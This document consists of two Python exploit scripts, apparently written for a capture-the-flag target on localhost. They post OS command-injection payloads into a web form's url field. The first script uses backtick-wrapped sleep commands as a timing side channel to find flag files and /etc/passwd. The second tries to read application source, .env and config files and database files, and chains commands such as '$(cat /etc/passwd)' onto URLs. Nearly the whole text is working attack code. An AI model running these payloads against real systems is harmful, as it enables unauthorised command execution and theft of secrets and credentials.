import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"

def test_with_timing(payload):
    data = f"url={payload}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    start = time.time()
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text)
    except Exception as e:
        elapsed = time.time() - start
        return elapsed, "ERROR", 0

print("[+] Using timing attacks with conditional sleep")
print("="*60)

# First establish baseline
tests = [
    ("`true`", "true only"),
    ("`sleep 0`", "no sleep"),
    ("`sleep 1`", "1 sec sleep"),
    ("`sleep 2`", "2 sec sleep"),
]

print("[BASELINE TESTS]")
for payload, desc in tests:
    elapsed, status, length = test_with_timing(payload)
    print(f"{desc}: {elapsed:.2f}s (status: {status})")

# Now test file existence with timing
print("\n[FILE EXISTENCE - TIMING BASED]")

file_checks = [
    ("`[ -f /etc/passwd ] && sleep 1`", "/etc/passwd (exists)"),
    ("`[ -f /nonexistent_12345 ] && sleep 1`", "nonexistent (not exists)"),
    ("`test -f flag.txt && sleep 1`", "flag.txt"),
    ("`test -f /app/flag.txt && sleep 1`", "/app/flag.txt"),  
    ("`test -f flag && sleep 1`", "flag"),
    ("`test -f /flag.txt && sleep 1`", "/flag.txt"),
    # Longer directories
    ("`test -f ../flag.txt && sleep 1`", "../flag.txt"),
    ("`test -f /tmp/flag.txt && sleep 1`", "/tmp/flag.txt"),
    ("`test -f /home/user/flag.txt && sleep 1`", "/home/user/flag.txt"),
    ("`test -f /var/flag.txt && sleep 1`", "/var/flag.txt"),
    ("`test -f /opt/flag.txt && sleep 1`", "/opt/flag.txt"),
    # Try without sleep - maybe cat fails slowly?
    ("`[ -f flag.txt ] && cat flag.txt`", "flag.txt cat (may have read time)"),
    ("`[ -f /app/flag.txt ] && cat /app/flag.txt`", "/app/flag.txt cat"),
]

found_path = None
for payload, desc in file_checks:
    elapsed, status, length = test_with_timing(payload)
    indicator = "[!] LONG DELAY = EXISTS" if elapsed >= 0.8 else "not found/quick"
    print(f"{desc}: {elapsed:.2f}s | {indicator}")
    if elapsed >= 0.8:
        print(f"    >>> FILE EXISTS: {desc} <<<")
        found_path = desc

print("\n" + "="*60)
if found_path:
    print(f"[+] FLAG FOUND: {found_path}")
else:
    print("[!] No flag file found via timing")
    print("[!] Note: /etc/passwd exists check should show increased timing")


import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload, timeout=5):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=timeout)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text), resp.text[:150]
    except requests.exceptions.Timeout:
        return timeout, "TIMEOUT", 0, ""
    except Exception as e:
        return 0, "ERROR", 0, str(e)[:80]

print("[+] Attempting to read application source and find secrets")
print("="*60)

# Try to read Python files that might contain secrets or flag location
read_tests = [
    # Source files
    ("`cat app.py 2>/dev/null`", "app.py"),
    ("`cat main.py 2>/dev/null`", "main.py"), 
    ("`cat /app/app.py 2>/dev/null`", "/app/app.py"),
    ("`cat /app/main.py 2>/dev/null`", "/app/main.py"),
    ("`ls -la 2>/dev/null`", "ls -la"),
    ("`find . -name '*.py' 2>/dev/null`", "find python files"),
    
    # Config files
    ("`cat config.py 2>/dev/null`", "config.py"),
    ("`cat settings.py 2>/dev/null`", "settings.py"),
    ("`cat .env 2>/dev/null`", ".env"),
    ("`cat .flaskenv 2>/dev/null`", ".flaskenv"),
    ("`cat requirements.txt 2>/dev/null`", "requirements.txt"),
    
    # Database files
    ("`ls *.db 2>/dev/null`", "list db files"),
    ("`ls *.sqlite* 2>/dev/null`", "list sqlite files"),
    ("`cat database.db 2>/dev/null`", "database.db"),
    ("`cat app.db 2>/dev/null`", "app.db"),
    
    # Directories
    ("`pwd`", "current directory"),
    ("`ls /app 2>/dev/null`", "list /app"),
    ("`ls /var/www 2>/dev/null`", "list /var/www"),
    ("`ls /opt 2>/dev/null`", "list /opt"),
]

for payload, desc in read_tests:
    elapsed, status, length, text = test(payload)
    print(f"\n[TEST] {desc}")
    print(f"  Payload: {payload}")
    print(f"  Time: {elapsed:.2f}s | Status: {status} | Length: {length}")
    if status == 200 and length > 61:
        print(f"  [!] POTENTIALLY INTERESTING OUTPUT!")
        print(f"  Response: {text}")
    elif status == "TIMEOUT":
        print(f"  [!] TIMEOUT - command may be producing output!")

# Let's see if the URL itself is treated differently
print("\n" + "="*60)
print("[URL ANALYSIS] Testing with valid URLs and command injection")
print("="*60)

url_tests = [
    "https://example.com",
    "https://example.com|cat /etc/passwd",
    "https://example.com;cat /etc/passwd",
    "https://example.com`cat /etc/passwd`",
    "https://example.com$(cat /etc/passwd)",
]

for payload in url_tests:
    elapsed, status, length, text = test(payload)
    print(f"\nPayload: {payload[:60]}...")
    print(f"  Status: {status} | Length: {length}")
    if length > 100:
        print(f"  Response: {text[:200]}")

